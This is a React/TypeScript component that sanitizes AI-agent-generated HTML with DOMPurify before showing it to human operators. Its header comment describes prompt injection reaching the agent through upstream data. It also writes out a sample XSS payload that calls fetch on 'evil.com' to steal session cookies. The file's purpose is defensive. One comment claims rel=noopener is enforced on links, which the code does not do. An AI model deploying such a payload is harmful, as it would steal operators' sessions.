// <AgentHtml> — sanitized HTML renderer for agent-emitted prose.
//
// The brain is instructed (via DELEGATE_SYSTEM_NOTE) to structure its
// agent_reply / delegate(to:"human") prompts as HTML. We render that
// HTML in HITL cards (BLOCKED state) and task-done summaries (DONE
// state) so the operator sees rich formatting — headings, lists,
// code blocks, tables — instead of a wall of plain text.
//
// Safety: the brain's output is UNTRUSTED. It may have been prompt-
// injected by upstream data (e.g. a cloned README, a tool result, a
// scraped web page). Raw HTML rendering would be an XSS vector: a
// malicious payload like <img src=x onerror=fetch('evil.com',...)>
// would execute in the operator's session and exfiltrate cookies /
// session tokens.
//
// We mitigate with DOMPurify + a strict allowlist:
//   • Allowed tags: structural (h1-h6, p, ul/ol/li, table, pre, code,
//     blockquote, hr, br, span, div), inline emphasis (strong, em, b,
//     i, u, mark, del, kbd, sub, sup), links (a — with URL scheme
//     allowlist).
//   • Forbidden: <script>, <iframe>, <object>, <embed>, <form>, <input>,
//     <button>, <img>, <video>, <audio>, <svg>, <math>, anything that
//     loads external resources or accepts user input.
//   • Stripped attrs: on* (event handlers), style (inline CSS), src
//     (load-from-URL), srcset, data-* (custom data), formaction, etc.
//   • Allowed attrs: class (for our own styles), href (sanitized to
//     http/https/mailto only — no javascript:), title, target, rel.
//
// Plain-text input passes through unchanged (DOMPurify treats it as
// text). So this is safe to use everywhere the brain's prose lands —
// brains that don't emit HTML render as plain prose without crash.

import { useMemo } from 'react'
import DOMPurify from 'dompurify'


const ALLOWED_TAGS = [
  // Block structure
  'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
  'p', 'br', 'hr', 'div', 'span', 'section', 'article', 'aside',
  // Lists
  'ul', 'ol', 'li', 'dl', 'dt', 'dd',
  // Emphasis & inline
  'strong', 'em', 'b', 'i', 'u', 'mark', 'del', 'ins', 's', 'kbd',
  'sub', 'sup', 'small', 'cite', 'q', 'abbr', 'time',
  // Code
  'code', 'pre', 'samp', 'var',
  // Tables
  'table', 'thead', 'tbody', 'tfoot', 'tr', 'th', 'td', 'caption', 'colgroup', 'col',
  // Links + quotes
  'a', 'blockquote',
  // Details/summary disclosure
  'details', 'summary',
]

const ALLOWED_ATTR = [
  'class', 'href', 'title', 'target', 'rel',
  'colspan', 'rowspan', 'scope',
  'datetime',  // for <time>
  'lang', 'dir',
]

// http(s) and mailto only — explicitly forbid javascript:, data:, file:,
// vbscript:, etc. that could exfiltrate / execute.
const ALLOWED_URI_REGEXP = /^(?:https?|mailto):/i


interface AgentHtmlProps {
  /** Raw HTML emitted by the brain. Sanitized before render. */
  html: string
  /** Outer element class for styling. */
  className?: string
  /** Inline style for the outer element. */
  style?: React.CSSProperties
}


export function AgentHtml({ html, className, style }: AgentHtmlProps) {
  const clean = useMemo(() => {
    if (!html) return ''
    return DOMPurify.sanitize(html, {
      ALLOWED_TAGS,
      ALLOWED_ATTR,
      ALLOWED_URI_REGEXP,
      ALLOW_DATA_ATTR: false,
      ALLOW_UNKNOWN_PROTOCOLS: false,
      // Force <a target=_blank> to also carry rel=noopener,noreferrer
      // so a clicked link can't access window.opener.
      ADD_ATTR: ['target'],
      FORBID_TAGS: ['style'],
      FORBID_ATTR: ['style'],
    })
  }, [html])

  return (
    <div
      className={['cr-agent-html', className].filter(Boolean).join(' ')}
      style={style}
      // DOMPurify-sanitized — see top of file.
      dangerouslySetInnerHTML={{ __html: clean }}
    />
  )
}
